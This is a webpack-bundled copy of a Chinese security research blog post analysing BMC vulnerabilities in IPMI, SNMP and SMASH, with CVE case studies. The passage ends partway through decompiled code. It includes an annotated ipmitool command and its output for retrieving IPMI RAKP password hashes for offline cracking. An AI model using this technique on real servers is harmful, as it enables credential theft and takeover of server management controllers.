"use strict";(self.webpackChunktest=self.webpackChunktest||[]).push([[7135],{3905:(e,n,t)=>{t.d(n,{Zo:()=>o,kt:()=>f});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var c=a.createContext({}),p=function(e){var n=a.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},o=function(e){var n=p(e.components);return a.createElement(c.Provider,{value:n},e.children)},m="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},u=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,s=e.originalType,c=e.parentName,o=i(e,["components","mdxType","originalType","parentName"]),m=p(t),u=r,f=m["".concat(c,".").concat(u)]||m[u]||d[u]||s;return t?a.createElement(f,l(l({ref:n},o),{},{components:t})):a.createElement(f,l({ref:n},o))}));function f(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var s=t.length,l=new Array(s);l[0]=u;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i[m]="string"==typeof e?e:r,l[1]=i;for(var p=2;p<s;p++)l[p]=t[p];return a.createElement.apply(null,l)}return a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},6027:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var a=t(7462),r=(t(7294),t(3905));const s={slug:"tiangongarticle010",title:"BMC \u6f0f\u6d1e\u5b9e\u4f8b\u5206\u6790",authors:"wangyikun",tags:["BMC"]},l="BMC \u6f0f\u6d1e\u5b9e\u4f8b\u5206\u6790",i={permalink:"/blog/tiangongarticle010",editUrl:"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-12-13-bmc/index.md",source:"@site/blog/2023-12-13-bmc/index.md",title:"BMC \u6f0f\u6d1e\u5b9e\u4f8b\u5206\u6790",description:"\u4e00\u3001\u524d\u8a00",date:"2023-12-13T00:00:00.000Z",formattedDate:"2023\u5e7412\u670813\u65e5",tags:[{label:"BMC",permalink:"/blog/tags/bmc"}],readingTime:16.575,hasTruncateMarker:!0,authors:[{name:"p1kk",title:"\u5929\u5de5\u5b9e\u9a8c\u5ba4\u5b89\u5168\u7814\u7a76\u5458",imageURL:"https://github.com/p1kk.png",key:"wangyikun"}],frontMatter:{slug:"tiangongarticle010",title:"BMC \u6f0f\u6d1e\u5b9e\u4f8b\u5206\u6790",authors:"wangyikun",tags:["BMC"]},nextItem:{title:"CodeDom \u6f0f\u6d1e\u6a21\u5f0f\u4e0e SharePoint RCE",permalink:"/blog/tiangongarticle009"}},c={authorsImageUrls:[void 0]},p=[{value:"\u4e00\u3001\u524d\u8a00",id:"\u4e00\u524d\u8a00",level:2},{value:"\u4e8c\u3001BMC\u4ecb\u7ecd",id:"\u4e8cbmc\u4ecb\u7ecd",level:2},{value:"\u4e09\u3001\u5e38\u89c1\u5e26\u5916\u7ba1\u7406\u901a\u4fe1\u63a5\u53e3",id:"\u4e09\u5e38\u89c1\u5e26\u5916\u7ba1\u7406\u901a\u4fe1\u63a5\u53e3",level:2},{value:"\uff08\u4e00\uff09IPMI",id:"\u4e00ipmi",level:3},{value:"\uff08\u4e8c\uff09Redfish",id:"\u4e8credfish",level:3},{value:"\u56db\u3001BMC\u5e38\u89c1\u653b\u51fb\u9762\u4e0e\u6f0f\u6d1e\u5b9e\u4f8b",id:"\u56dbbmc\u5e38\u89c1\u653b\u51fb\u9762\u4e0e\u6f0f\u6d1e\u5b9e\u4f8b",level:2},{value:"\uff08\u4e00\uff09SMASH",id:"\u4e00smash",level:3},{value:"\uff08\u4e8c\uff09SNMP",id:"\u4e8csnmp",level:3},{value:"\uff08\u4e09\uff09IPMI",id:"\u4e09ipmi",level:3},{value:"\u6848\u4f8b\u4e00\uff1aCVE-2013-4786",id:"\u6848\u4f8b\u4e00cve-2013-4786",level:4},{value:"\u6848\u4f8b\u4e8c\uff1aCVE-2023-34344 - AMI &amp; CVE-2022-42288 - NVIDIA",id:"\u6848\u4f8b\u4e8ccve-2023-34344---ami--cve-2022-42288---nvidia",level:4},{value:"\u6848\u4f8b\u4e09\uff1aCVE-2023-34341 - AMI &amp; CVE-2022-42278 - NVIDIA",id:"\u6848\u4f8b\u4e09cve-2023-34341---ami--cve-2022-42278---nvidia",level:4},{value:"\u6848\u4f8b\u56db\uff1aCVE-2023-34343 - AMI &amp; CVE-2022-42289 - NVIDIA",id:"\u6848\u4f8b\u56dbcve-2023-34343---ami--cve-2022-42289---nvidia",level:4},{value:"\u6848\u4f8b\u4e94\uff1aCVE-2023-34334 - AMI &amp; CVE-2022-42290 - NVIDIA",id:"\u6848\u4f8b\u4e94cve-2023-34334---ami--cve-2022-42290---nvidia",level:4},{value:"\u6848\u4f8b\u516d\uff1aCVE-2017-8979",id:"\u6848\u4f8b\u516dcve-2017-8979",level:4},{value:"\uff08\u56db\uff09HTTPS",id:"\u56dbhttps",level:3},{value:"\u6848\u4f8b\u4e00\uff1aCVE-2017-12542",id:"\u6848\u4f8b\u4e00cve-2017-12542",level:4},{value:"\u6848\u4f8b\u4e8c\uff1aCVE-2018-1207",id:"\u6848\u4f8b\u4e8ccve-2018-1207",level:4},{value:"\u6848\u4f8b\u4e09\uff1aCVE-2017-8979",id:"\u6848\u4f8b\u4e09cve-2017-8979",level:4},{value:"\u4e94\u3001\u603b\u7ed3",id:"\u4e94\u603b\u7ed3",level:2}],o={toc:p},m="wrapper";function d(e){let{components:n,...s}=e;return(0,r.kt)(m,(0,a.Z)({},o,s,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"\u4e00\u524d\u8a00"},"\u4e00\u3001\u524d\u8a00"),(0,r.kt)("p",null,"\u5728\u505a\u67d0\u4e9b\u670d\u52a1\u5668\u8bbe\u5907\u6f0f\u6d1e\u6316\u6398\u65f6\uff0c\u8d1f\u8d23\u7ba1\u7406\u670d\u52a1\u5668\u7684BMC\u6a21\u5757\u662f\u91cd\u8981\u7684\u4e00\u73af\u3002BMC\u7cfb\u7edf\u88ab\u653b\u7834\uff0c\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u4e3b\u673a\u7a7f\u900f\u6ca6\u9677\u3002\u672c\u6587\u5c06\u91cd\u70b9\u5206\u6790BMC\u76f8\u5173\u5386\u53f2\u6f0f\u6d1e\u3002"),(0,r.kt)("h2",{id:"\u4e8cbmc\u4ecb\u7ecd"},"\u4e8c\u3001BMC\u4ecb\u7ecd"),(0,r.kt)("p",null,"BMC\uff08Baseboard Management Controller\uff09\u4e3a\u4e3b\u677f\u7ba1\u7406\u63a7\u5236\u5668\u3002\u5b83\u662f\u4e00\u79cd\u786c\u4ef6\u8bbe\u5907\u6216\u5d4c\u5165\u5f0f\u7cfb\u7edf\uff0c\u901a\u5e38\u4f4d\u4e8e\u8ba1\u7b97\u673a\u4e3b\u677f\u4e0a\uff0c\u7528\u4e8e\u76d1\u63a7\u3001\u7ba1\u7406\u548c\u7ef4\u62a4\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u3002\u4ed6\u672c\u8d28\u4e0a\u4f7f\u7528\u4f20\u611f\u5668\u6765\u4e0e\u8bbe\u5907\u8fdb\u884c\u901a\u4fe1\uff0c\u5141\u8bb8\u5bf9\u88ab\u63a7\u673a\u5668\u8fdb\u884c\u5b8c\u5168\u63a7\u5236\uff08\u4f8b\u5982KVM\uff09\u3002\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u8bbf\u95eeBMC\uff0c\u7136\u540e\u91cd\u65b0\u914d\u7f6e\u4e3b\u673a\uff0c\u66f4\u6539BIOS\u8bbe\u7f6e\uff0c\u6216\u8005\u5237\u65b0\u53d7\u63a7\u8bbe\u5907\u7684\u56fa\u4ef6\u3002"),(0,r.kt)("p",null,"\u4e0d\u540c\u4f9b\u5e94\u5546\u7684\u670d\u52a1\u5668\u548c\u4e3b\u677f\u53ef\u80fd\u4f1a\u914d\u5907\u4e0d\u540c\u7c7b\u578b\u7684 BMC\uff0c\u4f8b\u5982\uff0cHP \u7684 iLO\u3001\u534e\u4e3a\u7684MGMT\u3001Dell \u7684 iDRAC\u3001\u6d6a\u6f6e\u7684IPMI \u7b49\uff0c\u90fd\u662f BMC \u7684\u5177\u4f53\u5b9e\u73b0\u3002"),(0,r.kt)("p",null," ",(0,r.kt)("img",{alt:"HP iLO",src:t(5166).Z,width:"740",height:"179"}),"\n",(0,r.kt)("img",{alt:"HUAWEI MGMT",src:t(4815).Z,width:"765",height:"192"}),"\n",(0,r.kt)("img",{alt:"DELL iDRAC",src:t(9975).Z,width:"767",height:"217"}),"\n",(0,r.kt)("img",{alt:"\u6d6a\u6f6e IPMI",src:t(1972).Z,width:"752",height:"185"})),(0,r.kt)("p",null,"BMC\u901a\u5e38\u88ab\u5b9e\u73b0\u4e3a\u5d4c\u5165\u5f0f\u7cfb\u7edf\uff0c\u82af\u7247\u5916\u56f4\u4f1a\u914d\u7f6e\u81ea\u5df1\u7684RAM\u3001Flash\u7b49\u5668\u4ef6\uff0c\u63d2\u7535BMC\u5c31\u4f1a\u5feb\u901f\u8fd0\u884c\u8d77\u6765\u3002"),(0,r.kt)("p",null,"BMC\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\uff0c\u4e0d\u4f9d\u8d56\u4e0e\u7cfb\u7edf\u4e0a\u7684\u5176\u4ed6\u786c\u4ef6\uff08\u6bd4\u5982CPU\u3001\u5185\u5b58\u7b49\u7b49\uff09\uff0c\u4e5f\u4e0d\u4f9d\u8d56BIOS\u3001OS\u7b49\u3002\u4f46BMC\u53ef\u4ee5\u4e0eBIOS\u548cOS\u4ea4\u4e92\uff0c\u4e00\u822c\u5927\u89c4\u6a21\u7684\u6570\u636e\u4e2d\u5fc3\u4f1a\u6709OS\u7cfb\u7edf\u7ba1\u7406\u8f6f\u4ef6\u4e0eBMC\u534f\u540c\u5de5\u4f5c\u5b9e\u73b0\u96c6\u4e2d\u7ba1\u7406\u7684\u5de5\u4f5c\u3002"),(0,r.kt)("h2",{id:"\u4e09\u5e38\u89c1\u5e26\u5916\u7ba1\u7406\u901a\u4fe1\u63a5\u53e3"},"\u4e09\u3001\u5e38\u89c1\u5e26\u5916\u7ba1\u7406\u901a\u4fe1\u63a5\u53e3"),(0,r.kt)("p",null,"\u5e26\u5916\u7ba1\u7406\u7cfb\u7edf\uff0c\u662f\u6307\u8fdc\u7a0b\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668BMC\u901a\u4fe1\uff0c\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u63a7\u5236\u7ba1\u7406\u548c\u7ef4\u62a4\u3002\u5e38\u89c1\u7684\u5e26\u5916\u7ba1\u7406\u63a5\u53e3\u6709 IPMI \u548c Redfish\u3002"),(0,r.kt)("h3",{id:"\u4e00ipmi"},"\uff08\u4e00\uff09IPMI"),(0,r.kt)("p",null,"IPMI\uff08Intelligent Platform Management Interface\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u7ba1\u7406\u548c\u76d1\u63a7\u670d\u52a1\u5668\u786c\u4ef6\u7684\u6807\u51c6\u63a5\u53e3\uff0c\u5b9a\u4e49\u4e86\u7528\u4e8e\u901a\u8fc7\u672c\u5730\u603b\u7ebf\u548c\u7f51\u7edc\u8fdb\u884c\u901a\u4fe1\u7684\u901a\u4fe1\u534f\u8bae\u3002"),(0,r.kt)("p",null,"IPMI\u63a5\u53e3\u63d0\u4f9b\u4e86\u4e00\u7ec4\u547d\u4ee4\u548c\u54cd\u5e94\uff0c\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8fdc\u7a0b\u8bbf\u95ee\u670d\u52a1\u5668\u3002IPMI\u63a5\u53e3\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c\u5de5\u5177\uff08ipmitool\uff09\u3001\u56fe\u5f62\u754c\u9762\u6216API\u8fdb\u884c\u8bbf\u95ee\u3002\uff08IPMI\u5728 2015 \u5e74\u516c\u5e03 2.0 v1.1\u6807\u51c6\u540e\uff0c\u505c\u6b62\u66f4\u65b0\u7ef4\u62a4\uff0c\u88ab RedFish \u6c38\u4e45\u4ee3\u66ff\u3002\u4e3a\u4e86\u505a\u5230\u517c\u5bb9\uff0c\u73b0\u5728\u4e0d\u5c11\u670d\u52a1\u5668\u4e0a\u4ecd\u7136\u652f\u6301 IPMI\u3002\uff09\u5b83\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3aBMC\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"# \u8fdc\u7a0b\u767b\u5f55\n$ ipmitool -I lanplus -H $host -U $username -P $pwd chassis status  \n# \u8bbe\u7f6e\u5e26\u5916\u7f51\u7edc\n$ ipmitool lan set 1 ipsrc dhcp \n$ ipmitool lan print 1\n$ ipmitool lan set 1 ipsrc static\n$ ipmitool lan set 1 ipaddress 10.1.199.211 Setting LAN IP Address to 10.1.199.211\n$ ipmitool lan set 1 netmask 255.255.255.0 Setting LAN Subnet Mask to 255.255.255.0\n$ ipmitool lan set 1 defgw ipaddr 10.1.199.1 Setting LAN Default Gateway IP to 10.1.199.1\n$ ipmitool lan print 1\n")),(0,r.kt)("h3",{id:"\u4e8credfish"},"\uff08\u4e8c\uff09Redfish"),(0,r.kt)("p",null,"Redfish \u662f\u4e00\u79cd\u57fa\u4e8e HTTPs \u670d\u52a1\u7684\u7ba1\u7406\u6807\u51c6\uff0c\u5229\u7528 RESTful \u63a5\u53e3\u5b9e\u73b0\u8bbe\u5907\u7ba1\u7406\u3002"),(0,r.kt)("p",null,"RESTful API\u63a5\u53e3\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u652f\u6301HTTP\u534f\u8bae\u7684\u5ba2\u6237\u7aef\u8fdb\u884c\u8bbf\u95ee\uff0c\u5982\u6d4f\u89c8\u5668\u3001\u547d\u4ee4\u884c\u5de5\u5177\u6216\u7f16\u7a0b\u8bed\u8a00\u3002\u4ee5\u4e0b\u662f\u4f7f\u7528Python\u8bbf\u95eeRESTful API\u63a5\u53e3\u83b7\u53d6\u670d\u52a1\u5668\u4fe1\u606f\u7684\u793a\u4f8b\u4ee3\u7801\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'import requests\nbmc_ip = "your_bmc_ip"\nusername = "your_username"\npassword = "your_password"\n\nurl = f"https://{bmc_ip}/redfish/v1/Systems/System.Embedded.1"\nresponse = requests.get(url, auth=(username, password), verify=False)\nif response.status_code == 200:\n    data = response.json()\n    print("Server Name: ", data["Name"])\n    print("Manufacturer: ", data["Manufacturer"])\n    print("Model: ", data["Model"])\n    print("Serial Number: ", data["SerialNumber"])\nelse:\n print("Error accessing BMC API")\n')),(0,r.kt)("h2",{id:"\u56dbbmc\u5e38\u89c1\u653b\u51fb\u9762\u4e0e\u6f0f\u6d1e\u5b9e\u4f8b"},"\u56db\u3001BMC\u5e38\u89c1\u653b\u51fb\u9762\u4e0e\u6f0f\u6d1e\u5b9e\u4f8b"),(0,r.kt)("h3",{id:"\u4e00smash"},"\uff08\u4e00\uff09SMASH"),(0,r.kt)("p",null,"SMASH\u662f\u4e00\u79cdDTMF\u6807\u51c6\u5316\u7684\u547d\u4ee4\u884c\uff0c\u901a\u8fc7SSH\u8fd0\u884c\uff0c\u5927\u591a\u6570\u653b\u51fb\u9762\u90fd\u662f\u8ba4\u8bc1\u540e\u7684\u3002\u53ef\u901a\u8fc7\u4e00\u4e9b\u4ea7\u54c1\u7684\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u3002"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:t(5583).Z,width:"796",height:"403"})),(0,r.kt)("h3",{id:"\u4e8csnmp"},"\uff08\u4e8c\uff09SNMP"),(0,r.kt)("p",null,"SNMP\u662f\u4e13\u95e8\u8bbe\u8ba1\u7528\u4e8e\u5728IP\u7f51\u7edc\u7ba1\u7406\u7f51\u7edc\u8282\u70b9\uff08\u670d\u52a1\u5668\u3001\u5de5\u4f5c\u7ad9\u3001\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u53caHubs\u7b49\uff09\u7684\u4e00\u79cd\u6807\u51c6\u534f\u8bae\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'$ snmpwalk -v1 -c public -m "./immalert.mib" 192.168.1.129\n    |       |       |               |               |  \n    |       |       |               |               |------\x3e \u76ee\u6807IP\n    |       |       |               |------\x3e \u6307\u5b9aMIB\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u7528\u4e8e\u89e3\u91ca\u548c\u67e5\u8be2SNMP\u6570\u636e\u7684\u4fe1\u606f\n    |       |       |------\x3e community\u5b57\u7b26public\uff0c\u7528\u4e8e\u53ea\u8bfb\u8bbf\u95ee\n    |       |------\x3e SNMP\u7248\u672cv1\n    |------\x3e \u6267\u884cSNMP Walk\u64cd\u4f5c\uff0c\u4ece\u8bbe\u5907\u4e0a\u83b7\u53d6\u5173\u4e8e\u5176\u7ba1\u7406\u4fe1\u606f\u7684\u6570\u636e  \n')),(0,r.kt)("p",null,"\u901a\u8fc7\u6267\u884csnmpwalk\uff0c\u8fd4\u56de\u4e00\u4e9b\u7ba1\u7406\u6570\u636e\u6216\u547d\u4ee4\uff0c\u6216\u8bb8\u53ef\u4ee5\u4ece\u4e2d\u627e\u5230\u4e00\u4e9b\u53ef\u63a7\u7684\u547d\u4ee4\u6ce8\u5165\u3002"),(0,r.kt)("h3",{id:"\u4e09ipmi"},"\uff08\u4e09\uff09IPMI"),(0,r.kt)("p",null,"IPMI\u662fBMC\u76f8\u5173\u534f\u8bae\uff0c\u7528\u4e8e\u8fdc\u7a0b\u7ba1\u7406BMC\u548c\u8bbf\u95ee\u5927\u90e8\u5206\u529f\u80fd\uff0c\u5305\u62ecUDP\u4e32\u884c\u63a7\u5236\u53f0"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"\u5386\u53f2\u95ee\u9898\uff1a")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Cipher Zero\u8ba4\u8bc1\u7ed5\u8fc7"),(0,r.kt)("li",{parentName:"ul"},"RAKP\u8ba4\u8bc1\u5d29\u6e83"),(0,r.kt)("li",{parentName:"ul"},"\u5f31Session ID")),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e00cve-2013-4786"},"\u6848\u4f8b\u4e00\uff1aCVE-2013-4786"),(0,r.kt)("p",null,"\u5206\u6790BMC\u53ef\u4ee5\u9996\u5148\u68c0\u67e5\u81ea2013\u4ee5\u6765\u5c31\u5df2\u77e5\u7684\u54c8\u5e0c\u6cc4\u9732\u3002"),(0,r.kt)("p",null,"\u4e0b\u56fe\u662fIPMI\u6807\u51c6\u624b\u518c\u622a\u56fe\uff0c\u89e3\u91ca\u4e86IPMI\u4e2d\u8eab\u4efd\u9a8c\u8bc1\u5982\u4f55\u5de5\u4f5c\u3002IPMI 2.0\u89c4\u8303\u4f7f\u7528RAKP\u8ba4\u8bc1\u5bc6\u94a5\u4ea4\u6362\u534f\u8bae\u3002"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:t(4595).Z,width:"705",height:"518"})),(0,r.kt)("p",null,"\u91cd\u70b9\u5173\u6ce8\u4e24\u6761\u6d88\u606f\uff1a"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Message 1"),"\u4ece\u7ba1\u7406\u5458\u63a7\u5236\u53f0\u53d1\u9001\u5230BMC\uff0c\u7ba1\u7406\u5458\u53ea\u9700\u8981\u5c06\u7528\u6237\u540d\u53d1\u9001\u5230BMC\uff0c\u800cBMC\u4f1a\u67e5\u627e\u7528\u6237\u540d\u5e76\u6839\u636e\u5305\u542b\u7528\u6237\u540d\u7684\u67d0\u4e9b\u6570\u636e\uff08\u6bd4\u5982\u63a7\u5236\u53f0\u548c\u53d7\u7ba1\u7cfb\u7edf\u7684Session ID\uff0c\u548c\u5bf9\u5e94\u7684\u968f\u673a\u6570\uff0c\u6743\u9650\u7ea7\u522b\uff0c\u7528\u6237\u540d\u957f\u5ea6\u548c\u7528\u6237\u540d\u672c\u8eab\uff09\u8ba1\u7b97HMAC\uff0c\u4e14\u5373\u5c06\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u7684\u5bc6\u7801\u5c06\u7528\u4f5c\u6b64HMAC\u8ba1\u7b97\u7684\u5bc6\u94a5\uff1b"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Message 2"),"\u5c06\u8fd9\u4e2aHMAC\u8ba1\u7b97\u7ed3\u679c\u88ab\u53d1\u9001\u56de\u7ba1\u7406\u5458\u3002"),(0,r.kt)("p",null,"\u89e6\u53d1RAKP\u7684\u4e00\u79cd\u7b80\u5355\u65b9\u6cd5\u662f\u4f7f\u7528",(0,r.kt)("inlineCode",{parentName:"p"},"ipmitool"),"\u53d1\u9001\u4efb\u610f\u547d\u4ee4\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 10.0.0.1 chassis identify\n                |         |         |           |             |         |------\x3e \u84dd\u8272uid\u6307\u793a\u706f\uff0c\u76f4\u63a5\u6267\u884c\u547d\u4ee4\uff0c\u53ea\u80fd\u7ef4\u630115\u79d2\n                |         |         |           |             |------\x3e \u6307\u5b9a\u76ee\u6807BMC\u8bbe\u5907\u7684IP\u5730\u5740\n                |         |         |           |------\x3e \u65e0\u6548\u7684\u5bc6\u7801\uff0c\u4e0d\u91cd\u8981\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u5b8c\u6210\u8ba4\u8bc1\n                |         |         |------\x3e \u7528\u6237\u540d\n                |         |------\x3e -v*3 \u542f\u7528\u8be6\u7ec6\u7684\u8c03\u8bd5\u8f93\u51fa\uff0c\u5f97\u5230\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa\u7684\u6570\u636e\u5305\n                |------\x3e IPMI\u63a5\u53e3\u7c7b\u578bLANplus\n")),(0,r.kt)("p",null,"\u8fd4\u56de\u6d88\u606f\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plain",metastring:"text",text:!0},"Message 1\uff1a\n   [...]\n   rakp2 mac input buffer (63 bytes)\n   a4 a3 a2 a0 4c 7f fb df ee a4 a3 96 b1 d0 7e 27\n   cd ef 32 ae 66 cf 87 b9 aa 3e 97 ed 5d 39 77 4b\n   bc 8a c5 a9 e2 da 1d d9 35 30 30 31 4d 53 00 00\n   00 00 00 00 00 00 00 00 14 05 41 44 4d 49 4e\n                               | |-------------|\n                               |         |\n                               |         |------\x3e \u7528\u6237\u540dADMIN\n                               |------\x3e \u7528\u6237\u540d\u957f\u5ea6\n   [...]\nMessage 2\uff1a\n   [...]\n   Key exchange auth code [sha1] : 0xede8ec3caeb235dbad1210ef985b1b19cdb40496\n                                  |------------------------------------------|\n                                                      HAMC\n   [...]\n   /\n   ...unauthorized name\n   /\n   ...\n")),(0,r.kt)("p",null,"\u56e0\u6b64\uff0c\u5982\u679c\u653b\u51fb\u8005\u77e5\u9053BMC\u7528\u6237\u6570\u636e\u5e93\u4e2d\u5b58\u5728\u7684\u6b63\u786e\u7684\u7528\u6237\u540d\uff0c\u4ed6\u5c31\u53ef\u4ee5\u63a5\u6536\u54c8\u5e0c\u503c\u5e76\u8ba1\u7b97\u5b83\uff0c\u5e76\u4e14\u5c06",(0,r.kt)("strong",{parentName:"p"},"\u731c\u6d4b\u5bc6\u7801/\u5bc6\u7801\u672c"),"\u7528\u4f5c\u6b64HMAC\u7684\u5bc6\u94a5\uff0c\u8ba1\u7b97\u51faHMAC\u5e76\u4e0eMessage 2\u4e2d\u7684HMAC\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4e00\u81f4\u5219\u5bc6\u7801\u6b63\u786e\u3002"),(0,r.kt)("p",null,"\u800c\u8fd9\u4e2a\u95ee\u9898\u81f3\u4eca\u90fd\u6ca1\u6709\u4fee\u590d\uff0c\u4f46\u4e00\u4e9b\u5382\u5546\u4f1a\u6709\u9632\u62a4\u63aa\u65bd\uff0c\u6bd4\u5982\u901a\u8fc7\u9632\u706b\u5899\u8bbe\u7f6e\u7b56\u7565\u3001\u5f3a\u5bc6\u7801\u6216\u7981\u7528IPMI\u89e3\u51b3\u3002"),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e8ccve-2023-34344---ami--cve-2022-42288---nvidia"},"\u6848\u4f8b\u4e8c\uff1aCVE-2023-34344 - AMI & CVE-2022-42288 - NVIDIA"),(0,r.kt)("p",null,"\u5982\u679c\u4e0d\u77e5\u9053\u6b63\u786e\u7684\u7528\u6237\u540d\u5462\uff1f"),(0,r.kt)("p",null,"\u5f53BMC\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u7528\u6237\u540d\u7684\u957f\u5ea6\u4e5f\u4f1a\u5728\u540c\u4e00\u6d88\u606f\u4e2d\u53d1\u9001\u3002\u53ef\u4ee5\u731c\u6d4bBMC\u5bf9\u7528\u6237\u540d\u7684\u68c0\u6d4b\u4f7f\u7528\u7684\u662fmemcpy\uff08\u5728AMI\u548cNVIDIA\u4e2d\u6b63\u662f\u5982\u6b64\uff09\uff0c\u90a3\u4e48\u670d\u52a1\u5668\u5904\u7406\u8fd9\u4e2a\u7528\u6237\u540d\u7684\u65f6\u95f4\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u901a\u8fc7",(0,r.kt)("strong",{parentName:"p"},"\u4fa7\u4fe1\u9053"),"\u7206\u7834\u7528\u6237\u540d\u3002"),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e09cve-2023-34341---ami--cve-2022-42278---nvidia"},"\u6848\u4f8b\u4e09\uff1aCVE-2023-34341 - AMI & CVE-2022-42278 - NVIDIA"),(0,r.kt)("p",null,"IPMI\u670d\u52a1\u5668\u76d1\u542cBMC\u5957\u63a5\u5b57\uff0c\u7279\u5b9a\u7684\u8bfb\u5199API\u5141\u8bb8\u8bfb\u53d6\u670d\u52a1\u5668\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u7684\u4efb\u4f55\u865a\u62df\u5185\u5b58\uff0c\u5e76\u8fd4\u56de\u5ba2\u6237\u7aef\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"if...          // if ( ActivateFlashStatus != 1 )\nif...          // if ( CalculateChksum( &req->address, req->hdr.struct_length) != req- >hdr.crc32\nif...          // if ( req->hdr.struct_length != 7 )\nsize = LOBYTE(req->size) | (HIBYTE(req->size) << 8);\naddress = ( LOBYTE(req->address) | (BYTE1(req->address) << 8) | ( BYTE2(req->address) << 16) | (HIBYTE(req->address) << 24)); \nheap_ mem = malloc(size);\nif...          // if ( !heap_ mem )\nmemcpy(heap_mem, address, size);\nmemcpy(&res[1], heap_mem, size);   // [1] Read\nres->status = 0;\nLastStatCode = 0;\nv15 = req->hdr.field_0\nv16 = (LOBYTE(req->hdr.field_0)\n(BYTE1(req->hdr.field_0) << 8) | (BYTE2(req->hdr.field_0) << 16) | (HIBYTE(req->hdr.field_0) << 24\nv17 = (LOBYTE(req->hdr.field_0) | (BYTE1(req->hdr.field_0) << 8) | (BYTE2(req->hdr.field_0) << 16) | (HIBYTE(req->hdr. field_0) << 24\nBYTE1(res->hdr.field_ 0) = BYTE1(req->hdr.field_ 0);\nLOBYTE(res->hdr.field_ 0) = v15;\nBYTE2(res->hdr.field_ 0) = v16;\nHIBYTE(res->hdr.field_ 0) = v17;\nres- >hdr.struct_length - LOBYTE(req->size) | (HIBYTE(req->size) << 8);\nres->hdr.crc32 = CalculateChksum(heap_ mem, LOBYTE(req->size)| (HIBYTE(req->size) << 8));\nfree(heap_mem);\nreturn (LOBYTE(req->size) | (HIBYTE(req->size) << 8)) + 